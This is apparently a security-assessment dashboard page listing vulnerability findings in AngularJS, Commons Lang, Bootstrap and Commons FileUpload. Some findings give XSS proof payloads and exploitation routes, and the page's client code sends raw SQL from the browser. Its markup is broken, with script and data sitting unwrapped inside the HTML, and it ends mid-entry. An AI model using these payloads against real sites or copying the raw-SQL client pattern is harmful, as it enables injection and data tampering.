<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>NES Security Assessment</title>
<style>
:root {
  --bg-primary: #0d1117;
  --bg-secondary: #161b22;
  --bg-tertiary: #21262d;
  --bg-card: #1c2128;
  --border: #30363d;
  --text-primary: #e6edf3;
  --text-secondary: #8b949e;
  --text-muted: #6e7681;
  --accent: #58a6ff;
  --accent-hover: #79c0ff;
  --critical: #f85149;
  --critical-bg: rgba(248, 81, 73, 0.15);
  --high: #d29922;
  --high-bg: rgba(210, 153, 34, 0.15);
  --medium: #e3b341;
  --medium-bg: rgba(227, 179, 65, 0.15);
  --low: #58a6ff;
  --low-bg: rgba(88, 166, 255, 0.15);
  --success: #3fb950;
  --success-bg: rgba(63, 185, 80, 0.15);
  --radius: 8px;
  --shadow: 0 1px 3px rgba(0,0,0,0.3), 0 1px 2px rgba(0,0,0,0.2);
  --transition: 0.2s ease;
}

* { margin: 0; padding: 0; box-sizing: border-box; }

body {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
  background: var(--bg-primary);
  color: var(--text-primary);
  line-height: 1.6;
  -webkit-font-smoothing: antialiased;
}

/* Header */
.header {
  background: var(--bg-secondary);
  border-bottom: 1px solid var(--border);
  padding: 16px 20px;
  position: sticky;
  top: 0;
  z-index: 100;
}
.header-inner {
  max-width: 1200px;
  margin: 0 auto;
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 12px;
}
.header h1 {
  font-size: 18px;
  font-weight: 600;
  color: var(--text-primary);
  white-space: nowrap;
}
.header h1 span { color: var(--accent); }
.header-meta {
  font-size: 12px;
  color: var(--text-secondary);
  text-align: right;
  white-space: nowrap;
}

/* Stats bar */
.stats-bar {
  background: var(--bg-secondary);
  border-bottom: 1px solid var(--border);
  padding: 12px 20px;
  overflow-x: auto;
  -webkit-overflow-scrolling: touch;
}
.stats-inner {
  max-width: 1200px;
  margin: 0 auto;
  display: flex;
  gap: 12px;
  min-width: max-content;
}
.stat-card {
  background: var(--bg-tertiary);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  padding: 10px 16px;
  min-width: 100px;
  text-align: center;
}
.stat-card .stat-value {
  font-size: 24px;
  font-weight: 700;
  line-height: 1.2;
}
.stat-card .stat-label {
  font-size: 11px;
  color: var(--text-secondary);
  text-transform: uppercase;
  letter-spacing: 0.5px;
}
.stat-critical .stat-value { color: var(--critical); }
.stat-high .stat-value { color: var(--high); }
.stat-medium .stat-value { color: var(--medium); }
.stat-low .stat-value { color: var(--low); }

/* Main tabs */
.main-tabs {
  background: var(--bg-secondary);
  border-bottom: 1px solid var(--border);
  padding: 0 20px;
}
.main-tabs-inner {
  max-width: 1200px;
  margin: 0 auto;
  display: flex;
  gap: 0;
}
.main-tab {
  padding: 12px 20px;
  font-size: 14px;
  font-weight: 500;
  color: var(--text-secondary);
  cursor: pointer;
  border-bottom: 2px solid transparent;
  transition: all var(--transition);
  display: flex;
  align-items: center;
  gap: 8px;
  white-space: nowrap;
  user-select: none;
}
.main-tab:hover { color: var(--text-primary); }
.main-tab.active {
  color: var(--accent);
  border-bottom-color: var(--accent);
}
.main-tab .tab-count {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  min-width: 22px;
  height: 20px;
  padding: 0 6px;
  border-radius: 10px;
  font-size: 11px;
  font-weight: 700;
  background: var(--bg-tertiary);
  color: var(--text-secondary);
}
.main-tab.active .tab-count {
  background: rgba(88, 166, 255, 0.2);
  color: var(--accent);
}

/* Filters */
.filters {
  background: var(--bg-secondary);
  border-bottom: 1px solid var(--border);
  padding: 12px 20px;
}
.filters-inner {
  max-width: 1200px;
  margin: 0 auto;
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
  align-items: center;
}
.filter-group {
  display: flex;
  align-items: center;
  gap: 6px;
}
.filter-group label {
  font-size: 12px;
  color: var(--text-secondary);
  font-weight: 500;
}
.filter-select, .search-input {
  background: var(--bg-tertiary);
  border: 1px solid var(--border);
  border-radius: 6px;
  color: var(--text-primary);
  font-size: 13px;
  padding: 6px 10px;
  outline: none;
  transition: border var(--transition);
}
.filter-select:focus, .search-input:focus {
  border-color: var(--accent);
}
.search-input {
  flex: 1;
  min-width: 180px;
}
.filter-select { min-width: 110px; }
.sort-btn {
  background: var(--bg-tertiary);
  border: 1px solid var(--border);
  border-radius: 6px;
  color: var(--text-secondary);
  font-size: 12px;
  padding: 6px 10px;
  cursor: pointer;
  transition: all var(--transition);
  white-space: nowrap;
}
.sort-btn:hover, .sort-btn.active {
  border-color: var(--accent);
  color: var(--accent);
}

/* Main content */
.main {
  max-width: 1200px;
  margin: 0 auto;
  padding: 16px 20px;
}

/* Project group headers */
.project-group-header {
  font-size: 13px;
  font-weight: 600;
  color: var(--text-secondary);
  text-transform: uppercase;
  letter-spacing: 0.5px;
  padding: 16px 0 8px;
  border-bottom: 1px solid var(--border);
  margin-bottom: 10px;
  display: flex;
  align-items: center;
  gap: 8px;
}
.project-group-header:first-child { padding-top: 0; }
.project-group-count {
  font-size: 11px;
  color: var(--text-muted);
  font-weight: 400;
}

/* Finding cards */
.findings-list { display: flex; flex-direction: column; gap: 10px; }
.finding-card {
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  padding: 14px 16px;
  cursor: pointer;
  transition: all var(--transition);
  display: flex;
  flex-direction: column;
  gap: 8px;
}
.finding-card:hover {
  border-color: var(--accent);
  box-shadow: var(--shadow);
}

/* Primary finding cards (Our Findings) - bolder */
.finding-card.card-primary {
  border-left: 3px solid var(--accent);
  background: linear-gradient(135deg, var(--bg-card) 0%, rgba(88,166,255,0.03) 100%);
}
.finding-card.card-primary:hover {
  border-color: var(--accent);
  border-left-color: var(--accent-hover);
}

/* External report cards - muted */
.finding-card.card-external {
  opacity: 0.85;
  border-left: 3px solid #d2a8ff;
}
.finding-card.card-external:hover {
  opacity: 1;
  border-color: #d2a8ff;
}

/* CVE list items - compact */
.cve-list-item {
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: 6px;
  padding: 10px 14px;
  cursor: pointer;
  transition: all var(--transition);
  display: flex;
  align-items: center;
  gap: 10px;
}
.cve-list-item:hover {
  border-color: var(--accent);
}
.cve-list-item .severity-badge { flex-shrink: 0; }
.cve-list-item .cve-title {
  font-size: 13px;
  font-weight: 500;
  color: var(--text-primary);
  flex: 1;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}
.cve-list-item .cve-meta {
  display: flex;
  gap: 8px;
  align-items: center;
  flex-shrink: 0;
}

.finding-card-header {
  display: flex;
  align-items: flex-start;
  gap: 10px;
}
.severity-badge {
  display: inline-flex;
  align-items: center;
  padding: 2px 8px;
  border-radius: 12px;
  font-size: 10px;
  font-weight: 700;
  text-transform: uppercase;
  letter-spacing: 0.5px;
  white-space: nowrap;
  flex-shrink: 0;
}
.severity-CRITICAL { background: var(--critical-bg); color: var(--critical); border: 1px solid var(--critical); }
.severity-HIGH { background: var(--high-bg); color: var(--high); border: 1px solid var(--high); }
.severity-MEDIUM { background: var(--medium-bg); color: var(--medium); border: 1px solid var(--medium); }
.severity-LOW { background: var(--low-bg); color: var(--low); border: 1px solid var(--low); }

.finding-title {
  font-size: 14px;
  font-weight: 600;
  color: var(--text-primary);
  line-height: 1.4;
  flex: 1;
}
.finding-meta {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
  align-items: center;
}
.meta-tag {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  font-size: 11px;
  color: var(--text-secondary);
  background: var(--bg-tertiary);
  padding: 2px 8px;
  border-radius: 4px;
}
.meta-tag.category-hackerone { color: #d2a8ff; }
.meta-tag.category-code_review { color: #79c0ff; }
.meta-tag.category-cve_catalog { color: #7ee787; }

/* Source badges */
.source-badge {
  display: inline-flex;
  align-items: center;
  padding: 2px 8px;
  border-radius: 4px;
  font-size: 10px;
  font-weight: 700;
  text-transform: uppercase;
  letter-spacing: 0.5px;
}
.source-badge.badge-validated {
  background: rgba(63, 185, 80, 0.2);
  color: #3fb950;
  border: 1px solid rgba(63, 185, 80, 0.4);
}
.source-badge.badge-investigation {
  background: rgba(88, 166, 255, 0.2);
  color: #58a6ff;
  border: 1px solid rgba(88, 166, 255, 0.4);
}
.source-badge.badge-code-review {
  background: rgba(121, 192, 255, 0.15);
  color: #79c0ff;
  border: 1px solid rgba(121, 192, 255, 0.3);
}
.source-badge.badge-hackerone {
  background: rgba(210, 168, 255, 0.15);
  color: #d2a8ff;
  border: 1px solid rgba(210, 168, 255, 0.3);
}
.source-badge.badge-cve {
  background: rgba(126, 231, 135, 0.12);
  color: #7ee787;
  border: 1px solid rgba(126, 231, 135, 0.25);
}
.source-badge.badge-cve-candidate {
  background: rgba(63, 185, 80, 0.25);
  color: #3fb950;
  border: 2px solid rgba(63, 185, 80, 0.6);
  font-weight: 800;
}
.source-badge.badge-silent-fix {
  background: rgba(210, 153, 34, 0.15);
  color: #d29922;
  border: 1px solid rgba(210, 153, 34, 0.4);
}
.source-badge.badge-reviewed-safe {
  background: rgba(110, 118, 129, 0.15);
  color: #8b949e;
  border: 1px solid rgba(110, 118, 129, 0.3);
}
.source-badge.badge-has-poc {
  background: transparent;
  color: #f85149;
  border: 1px solid rgba(248, 81, 73, 0.5);
}

.status-tag {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  font-size: 11px;
  padding: 2px 8px;
  border-radius: 4px;
  font-weight: 500;
}
.status-investigating { background: rgba(88,166,255,0.15); color: #58a6ff; }
.status-confirmed { background: rgba(210,153,34,0.15); color: #d29922; }
.status-in_progress { background: rgba(210,153,34,0.15); color: #e3b341; }
.status-fixed { background: rgba(63,185,80,0.15); color: #3fb950; }
.status-released { background: rgba(63,185,80,0.2); color: #56d364; }
.status-wont_fix { background: rgba(110,118,129,0.15); color: #8b949e; }
.status-duplicate { background: rgba(110,118,129,0.15); color: #6e7681; }

.finding-desc-preview {
  font-size: 13px;
  color: var(--text-secondary);
  display: -webkit-box;
  -webkit-line-clamp: 2;
  -webkit-box-orient: vertical;
  overflow: hidden;
}

/* Detail panel (slide-in on mobile) */
.detail-overlay {
  display: none;
  position: fixed;
  inset: 0;
  z-index: 200;
  background: rgba(0,0,0,0.6);
}
.detail-overlay.active { display: flex; }
.detail-panel {
  background: var(--bg-secondary);
  width: 100%;
  max-width: 700px;
  margin-left: auto;
  height: 100%;
  overflow-y: auto;
  border-left: 1px solid var(--border);
  animation: slideIn 0.2s ease;
}
@keyframes slideIn {
  from { transform: translateX(100%); }
  to { transform: translateX(0); }
}
.detail-header {
  position: sticky;
  top: 0;
  background: var(--bg-secondary);
  border-bottom: 1px solid var(--border);
  padding: 16px 20px;
  display: flex;
  align-items: center;
  gap: 12px;
  z-index: 10;
}
.detail-close {
  background: var(--bg-tertiary);
  border: 1px solid var(--border);
  border-radius: 6px;
  color: var(--text-secondary);
  font-size: 18px;
  width: 36px;
  height: 36px;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  flex-shrink: 0;
  transition: all var(--transition);
}
.detail-close:hover { border-color: var(--accent); color: var(--accent); }
.detail-title {
  font-size: 16px;
  font-weight: 600;
  flex: 1;
}
.detail-body { padding: 20px; display: flex; flex-direction: column; gap: 20px; }

.detail-section {
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  overflow: hidden;
}
.detail-section-header {
  background: var(--bg-tertiary);
  padding: 10px 16px;
  font-size: 12px;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 0.5px;
  color: var(--text-secondary);
  border-bottom: 1px solid var(--border);
}
.detail-section-body {
  padding: 14px 16px;
  font-size: 13px;
  color: var(--text-secondary);
  line-height: 1.7;
  white-space: pre-wrap;
  word-break: break-word;
}

/* Status dropdown in detail */
.status-controls {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 14px 16px;
}
.status-select {
  background: var(--bg-tertiary);
  border: 1px solid var(--border);
  border-radius: 6px;
  color: var(--text-primary);
  font-size: 13px;
  padding: 8px 12px;
  flex: 1;
  outline: none;
}
.status-select:focus { border-color: var(--accent); }
.btn {
  background: var(--accent);
  color: #fff;
  border: none;
  border-radius: 6px;
  font-size: 13px;
  font-weight: 500;
  padding: 8px 16px;
  cursor: pointer;
  transition: background var(--transition);
  white-space: nowrap;
}
.btn:hover { background: var(--accent-hover); }
.btn-secondary {
  background: var(--bg-tertiary);
  border: 1px solid var(--border);
  color: var(--text-primary);
}
.btn-secondary:hover { border-color: var(--accent); }

/* Comments section */
.comments-list { display: flex; flex-direction: column; gap: 10px; padding: 14px 16px; }
.comment-item {
  background: var(--bg-tertiary);
  border-radius: 6px;
  padding: 10px 12px;
}
.comment-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 6px;
}
.comment-author { font-size: 12px; font-weight: 600; color: var(--accent); }
.comment-time { font-size: 11px; color: var(--text-muted); }
.comment-text { font-size: 13px; color: var(--text-secondary); line-height: 1.5; }
.comment-form {
  display: flex;
  gap: 8px;
  padding: 0 16px 14px;
}
.comment-input {
  background: var(--bg-tertiary);
  border: 1px solid var(--border);
  border-radius: 6px;
  color: var(--text-primary);
  font-size: 13px;
  padding: 8px 12px;
  flex: 1;
  outline: none;
  resize: none;
  font-family: inherit;
  min-height: 38px;
}
.comment-input:focus { border-color: var(--accent); }

/* Tags row in detail */
.detail-tags {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
  padding: 14px 16px;
}

/* Empty state */
.empty-state {
  text-align: center;
  padding: 60px 20px;
  color: var(--text-muted);
}
.empty-state h3 { font-size: 16px; margin-bottom: 8px; color: var(--text-secondary); }

/* Results count */
.results-info {
  font-size: 12px;
  color: var(--text-muted);
  padding: 8px 0;
}

/* Tab navigation for detail view */
.detail-tabs {
  display: flex;
  border-bottom: 1px solid var(--border);
  background: var(--bg-secondary);
  overflow-x: auto;
}
.detail-tab {
  padding: 10px 16px;
  font-size: 13px;
  color: var(--text-secondary);
  cursor: pointer;
  border-bottom: 2px solid transparent;
  white-space: nowrap;
  transition: all var(--transition);
}
.detail-tab:hover { color: var(--text-primary); }
.detail-tab.active {
  color: var(--accent);
  border-bottom-color: var(--accent);
}
.tab-content { display: none; }
.tab-content.active { display: block; }

/* Reproduction path */
.repro-path {
  font-family: monospace;
  font-size: 11px;
  color: var(--text-muted);
  background: var(--bg-tertiary);
  padding: 4px 8px;
  border-radius: 4px;
  display: inline-block;
  margin-top: 4px;
}

/* Responsive */
@media (max-width: 600px) {
  .header h1 { font-size: 15px; }
  .header-meta { display: none; }
  .stat-card { padding: 8px 12px; min-width: 80px; }
  .stat-card .stat-value { font-size: 20px; }
  .filters-inner { flex-direction: column; }
  .filter-group { width: 100%; }
  .filter-select, .search-input { width: 100%; flex: 1; }
  .detail-panel { max-width: 100%; }
  .main-tab { padding: 10px 12px; font-size: 13px; }
}

/* Scrollbar */
::-webkit-scrollbar { width: 6px; height: 6px; }
::-webkit-scrollbar-track { background: transparent; }
::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
::-webkit-scrollbar-thumb:hover { background: var(--text-muted); }

/* Category icons */
.cat-icon {
  display: inline-block;
  width: 6px;
  height: 6px;
  border-radius: 50%;
  margin-right: 4px;
}
.cat-hackerone { background: #d2a8ff; }
.cat-code_review { background: #79c0ff; }
.cat-cve_catalog { background: #7ee787; }
.cat-investigation { background: #3fb950; }

/* PoC code blocks */
pre code {
  font-family: 'SF Mono', 'Fira Code', 'Consolas', monospace;
}

/* Project dashboard grid */
@media (max-width: 600px) {
  .main-tabs-inner { overflow-x: auto; -webkit-overflow-scrolling: touch; }
  .filters-inner { overflow-x: auto; }
}
</style>
</head>
<body>

<div class="header">
  <div class="header-inner">
    <h1><span>NES</span> Security Assessment</h1>
    <div class="header-meta">
      April 2026 &middot; 9 Projects
    </div>
  </div>
</div>

<div class="stats-bar">
  <div class="stats-inner">
    <div class="stat-card">
      <div class="stat-value" id="totalCount">0</div>
      <div class="stat-label">Total</div>
    </div>
    <div class="stat-card stat-critical">
      <div class="stat-value" id="criticalCount">0</div>
      <div class="stat-label">Critical</div>
    </div>
    <div class="stat-card stat-high">
      <div class="stat-value" id="highCount">0</div>
      <div class="stat-label">High</div>
    </div>
    <div class="stat-card stat-medium">
      <div class="stat-value" id="mediumCount">0</div>
      <div class="stat-label">Medium</div>
    </div>
    <div class="stat-card stat-low">
      <div class="stat-value" id="lowCount">0</div>
      <div class="stat-label">Low</div>
    </div>
    <div class="stat-card">
      <div class="stat-value" style="color:var(--critical)" id="unpatchedCount">0</div>
      <div class="stat-label">Unpatched</div>
    </div>
    <div class="stat-card">
      <div class="stat-value" style="color:var(--success)" id="patchedCount">0</div>
      <div class="stat-label">Patched</div>
    </div>
  </div>
</div>

<!-- Main view tabs -->
<div class="main-tabs">
  <div class="main-tabs-inner">
    <div class="main-tab" data-view="projects" onclick="switchMainTab('projects')">
      Projects <span class="tab-count" id="projectsCount">0</span>
    </div>
    <div class="main-tab active" data-view="our_findings" onclick="switchMainTab('our_findings')">
      Our Findings <span class="tab-count" id="ourFindingsCount">0</span>
    </div>
    <div class="main-tab" data-view="external_reports" onclick="switchMainTab('external_reports')">
      External Reports <span class="tab-count" id="externalReportsCount">0</span>
    </div>
    <div class="main-tab" data-view="known_cves" onclick="switchMainTab('known_cves')">
      Known CVEs <span class="tab-count" id="knownCvesCount">0</span>
    </div>
    <div class="main-tab" data-view="cve_catalog" onclick="switchMainTab('cve_catalog')">
      CVE Catalog <span class="tab-count" id="cveCatalogCount">0</span>
    </div>
    <div class="main-tab" data-view="hackerone" onclick="switchMainTab('hackerone')">
      HackerOne <span class="tab-count" id="hackeroneCount">0</span>
    </div>
  </div>
</div>

<div class="filters">

const DB_ENDPOINT = window.__APP_CONFIG__?.DB_ENDPOINT || '/api/graphql';
const DB_TOKEN = window.__APP_CONFIG__?.DB_TOKEN || '';

const DB = {
  async query(sql) {
    try {
      const res = await fetch(DB_ENDPOINT, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer ' + DB_TOKEN
        },
        body: JSON.stringify({
          query: `mutation { datasourceMutations { query(sql: ${JSON.stringify(sql)}) { rows rowCount } } }`
        })
      });
      const json = await res.json();
      if (json.errors) throw new Error(json.errors[0].message);
      return json.data.datasourceMutations.query.rows;
    } catch (e) {
      console.error('DB query error:', e);
      throw e;
    }
  },
  async mutate(sql) {
    try {
      const res = await fetch(DB_ENDPOINT, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer ' + DB_TOKEN
        },
        body: JSON.stringify({
          query: `mutation { datasourceMutations { mutate(sql: ${JSON.stringify(sql)}) { rowsAffected } } }`
        })
      });
      const json = await res.json();
      if (json.errors) throw new Error(json.errors[0].message);
      return json.data.datasourceMutations.mutate;
    } catch (e) {
      console.error('DB mutate error:', e);
      throw e;
    }
  },
  escape(str) { return str ? str.replace(/'/g, "''") : ''; }
};

  {id:"a0000013-0006-4000-8000-000000000006",title:"No maxDepth Parameter in angular.copy() (1.5.x)",severity:"LOW",project:"AngularJS 1.5.x (nes-1.5.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"The angular.copy() function in 1.5.x does not accept a maxDepth parameter. Deeply nested objects could cause stack exhaustion. Circular references are protected via stackSource/stackDest arrays.",affected_files:"src/Angular.js:823",exploitation:"Application passes attacker-controlled deeply nested non-circular objects to angular.copy().",remediation:"Add maxDepth parameter support (present in 1.7+) or document the limitation.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"1.5.x",cve_ids:null,hackerone_id:null},

  {id:"a0000003-0003-4000-8000-000000000003",title:"jqLite.html() Direct innerHTML Assignment",severity:"LOW",project:"AngularJS 1.9.x (nes-1.9.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"The jqLite.html(value) setter directly assigns to element.innerHTML without sanitization (CVE-2022-25869 pattern). Framework security relies on $sce and $sanitize to gate untrusted HTML. Only exploitable if application code bypasses these services.",affected_files:"src/jqLite.js:807",exploitation:"Application code bypasses $sce/$sanitize and passes attacker-controlled strings directly to jqLite.html().",remediation:"Ensure all untrusted HTML passes through $sce/$sanitize before reaching jqLite.html().",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"1.9.x",cve_ids:"CVE-2022-25869",hackerone_id:null},
  // === Apache Commons Lang 3.12.x (nes-3.12.x) ===
  {id:"fa323917-2f56-4078-b06a-87687e2020f4",title:"Unsafe Deserialization in SerializationUtils.deserialize(InputStream)",severity:"MEDIUM",project:"Apache Commons Lang 3.12.x (nes-3.12.x)",category:"Our Findings",status:"Confirmed",source_badge:"Wave 8",description:"`SerializationUtils.deserialize(InputStream)` creates a raw `ObjectInputStream` and calls `readObject()` with no class filtering or allowlist. Any Java class present on the classpath can be deserialized if an attacker can supply the input bytes. The companion `deserialize(byte[])` overload (line 177) delegates to this same method. The `clone()` helper (line 130) uses `ClassLoaderAwareObjectInputStream` which overrides `resolveClass()` but does NOT restrict which classes may be deserialized — it only changes how classes are resolved, providing no security benefit against gadget-chain attacks. CWE: CWE-502 (Deserialization of Untrusted Data)",affected_files:"`src/main/java/org/apache/commons/lang3/SerializationUtils.java:211-220`",exploitation:"If an application passes untrusted data to `SerializationUtils.deserialize()`, an attacker can trigger remote code execution via a suitable gadget chain (e.g., commons-collections, spring, etc.). This is the same class of vulnerability as CVE-2015-7501 in commons-collections.",remediation:"Applications should never pass untrusted bytes to `SerializationUtils.deserialize()`. If deserialization of external data is required, use a filtering `ObjectInputStream` (via `ObjectInputFilter` / `ObjectInputFilter.Config.createFilter()`, available since Java 9) or a safer serialization format (JSON, protobuf, etc.). Consider adding a Javadoc warning to this method and its overloads. NES may wish to add a `@SuppressWarnings` or explicit security note to alert consumers.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:null,cve_ids:"CVE-2015-7501",hackerone_id:null},
  {id:"1cbe1ec3-bce2-4e9c-a571-4e138cda10c3",title:"Non-Cryptographic PRNG in RandomStringUtils and RandomUtils",severity:"INFO",project:"Apache Commons Lang 3.12.x (nes-3.12.x)",category:"Our Findings",status:"Confirmed",source_badge:"Wave 8",description:"Both classes use `java.util.Random` (not `SecureRandom`) as their internal PRNG. The Javadoc does include a caveat noting this is not cryptographically secure. The classes are also marked `@Deprecated` (deprecated since 3.6 in favor of commons-text / commons-rng). CWE: CWE-338 (Use of Cryptographically Weak Pseudo-Random Number Generator)",affected_files:"`src/main/java/org/apache/commons/lang3/RandomStringUtils.java:55`, `src/main/java/org/apache/commons/lang3/RandomUtils.java:39`",exploitation:"If a caller uses `RandomStringUtils` or `RandomUtils` to generate security-sensitive values (tokens, passwords, session identifiers), the output is predictable. This is a misuse scenario rather than a library defect.",remediation:"No change needed to the library itself; the existing deprecation notice is appropriate. NES documentation or release notes may optionally reinforce the warning to consumers.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:null,cve_ids:null,hackerone_id:null},
  {id:"9bc2cea5-2ba1-46a8-9aa2-69e8c4a918e7",title:"CVE-2025-48924 — Addressed in NES Patch",severity:"INFO",project:"Apache Commons Lang 3.12.x (nes-3.12.x)",category:"Our Findings",status:"Confirmed",source_badge:"Wave 8",description:"The upstream 3.12.0 release contained a recursive implementation of `ClassUtils.getClass()` that could be triggered to throw a `StackOverflowError` on very long or deeply-nested class name inputs. This was discovered via OssFuzz (issue 42522972) while fuzzing Apache Commons Text's `StringSubstitutorInterpolatorFuzzer`. NES commit `d3c3fc11` rewrites the method iteratively using a `do-while` loop, eliminating the recursion entirely. The fix also introduces a package-private `getPrimitiveClass()` helper. CWE: CWE-674 (Uncontrolled Recursion)",affected_files:"`src/main/java/org/apache/commons/lang3/ClassUtils.java:1071-1088`",exploitation:"(Pre-patch) Denial of service via `StackOverflowError` when passing a crafted class name string. Not exploitable for RCE.",remediation:"No action required. The fix is correctly applied and the iterative loop terminates reliably: it replaces one dot at a time (rightmost), so the string has at most O(n) dots where n is the length, ensuring the loop runs at most n times before `lastDotIndex` returns -1 and the loop exits.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:null,cve_ids:"CVE-2025-48924",hackerone_id:null},

  {id:"a0000006-0004-4000-8000-000000000004",title:"Button setState XSS Without DOMPurify",severity:"MEDIUM",project:"Bootstrap 2.3.x (nes-2.3.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"For non-input button elements, $el.html(sanitizedState) is called. If DOMPurify is not loaded (only a devDependency), sanitizedState contains the raw unsanitized data-*-text value. The CVE-2024-6485 fix is functionally inert without DOMPurify.",affected_files:"js/bootstrap-button.js:35-44",exploitation:"Set data-loading-text=\"<img src=x onerror=alert(1)>\" on button element, trigger .button('loading'). Without DOMPurify, XSS payload executes.",remediation:"Make DOMPurify a runtime dependency or peer dependency.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"2.3.x",cve_ids:"CVE-2024-6485",hackerone_id:null},
  {id:"a0000006-0002-4000-8000-000000000002",title:"Modal Remote Content Loading XSS",severity:"MEDIUM",project:"Bootstrap 2.3.x (nes-2.3.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"jQuery .load() fetches a remote URL and inserts response as HTML into .modal-body without sanitization. The remote option is derived from href when it does not contain #. Arbitrary HTML/JS from remote endpoint injected into DOM.",affected_files:"js/bootstrap-modal.js:24,230",exploitation:"User clicks modal trigger where href points to attacker-controlled URL. Response HTML injected directly into modal body.",remediation:"Add sanitize option to modal or deprecate remote content loading.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"2.3.x",cve_ids:null,hackerone_id:null},
  {id:"a0000006-0001-4000-8000-000000000001",title:"Typeahead Highlighter XSS via Source Data",severity:"MEDIUM",project:"Bootstrap 2.3.x (nes-2.3.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"The highlighter() function wraps regex matches in <strong> tags and inserts via .html(). While query is regex-escaped, item (source data value) is never HTML-escaped. Malicious source data containing <img src=x onerror=alert(1)> executes when rendered.",affected_files:"js/bootstrap-typeahead.js:121-133",exploitation:"Attacker controls typeahead source data (database, API). User types in typeahead, malicious item rendered as HTML.",remediation:"HTML-escape item before wrapping matches in <strong> tags.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"2.3.x",cve_ids:null,hackerone_id:null},
  {id:"a0000006-0003-4000-8000-000000000003",title:"Tooltip/Popover Sanitizer Returns Unsanitized HTML Without DOMPurify",severity:"MEDIUM",project:"Bootstrap 2.3.x (nes-2.3.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"The CVE-2025-1647 fix adds DOMPurify as fallback when createHTMLDocument is unavailable (e.g. via DOM Clobbering). But DOMPurify is only a devDependency, not runtime. Without DOMPurify loaded, unsafeHtml is returned unchanged with only a console warning.",affected_files:"js/bootstrap-tooltip.js:124-129",exploitation:"DOM Clobbering overwrites document.implementation, then tooltip/popover with malicious data-template executes XSS. CVE-2025-1647 fix bypassed because DOMPurify not present.",remediation:"Make DOMPurify a runtime dependency or peer dependency.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"2.3.x",cve_ids:"CVE-2025-1647",hackerone_id:null},
  {id:"a0000006-0005-4000-8000-000000000005",title:"Scrollspy Selector Injection via Target Values",severity:"LOW",project:"Bootstrap 2.3.x (nes-2.3.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"The target value is concatenated directly into a jQuery selector string without escaping. If an href contains \"] or similar selector metacharacters, it could break out of the attribute selector. Exploitability constrained by /^#\\\\w/ filter.",affected_files:"js/bootstrap-scrollspy.js:94-98",exploitation:"Crafted href values with selector metacharacters break out of attribute selector context.",remediation:"Escape selector metacharacters in target values.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"2.3.x",cve_ids:null,hackerone_id:null},
  {id:"a0000006-0006-4000-8000-000000000006",title:"Option Injection via $.extend with $this.data()",severity:"LOW",project:"Bootstrap 2.3.x (nes-2.3.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"jQuery .data() reads all data-* attributes and merges into plugin options via shallow $.extend. Not classical prototype pollution (jQuery < 3.x shallow extend doesn't traverse __proto__) but allows option injection if arbitrary data-* attributes can be set.",affected_files:"js/bootstrap-collapse.js:125, js/bootstrap-modal.js:195,230, js/bootstrap-carousel.js:194",exploitation:"Attacker sets arbitrary data-* attributes on elements to inject plugin options.",remediation:"Validate options after merge or use a strict allowlist of valid options.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"2.3.x",cve_ids:null,hackerone_id:null},

  // === Commons FileUpload 1.5.x (nes-1.5.x) ===
  {id:"b54e8708-806a-4ee7-b317-58a12fa14a70",title:"`fileCountMax` Not Enforced in Streaming Iterator API",severity:"MEDIUM",project:"Commons FileUpload 1.5.x (nes-1.5.x)",category:"Our Findings",status:"Confirmed",source_badge:null,description:"[CFU-001] CWE-400 (Upstream-Inherited)\n\n**Severity**: Medium  \n**CWE**: CWE-400 (Uncontrolled Resource Consumption)  \n**Classification**: Upstream-Inherited  \n\n**Description**:  \nThe `fileCountMax` limit is only checked inside `parseRequest()` (the non-streaming batch API), not inside `FileItemIteratorImpl` (the streaming API used via `getItemIterator()`). Applications that use the streaming API directly — which is the recommended approach for memory efficiency — receive no protection from the `fileCountMax` limit even if it is configured.\n\n**Evidence**:  \nIn `FileUploadBase.java`, the limit check occurs only in `parseRequest()`:\n```java\n// FileUploadBase.java line 377\nif (items.size() == fileCountMax) {\n    throw new FileCountLimitExceededException(ATTACHMENT, getFileCountMax());\n}\n```\n\nThe `FileItemIteratorImpl.findNextItem()` method (lines 1068–1134) and 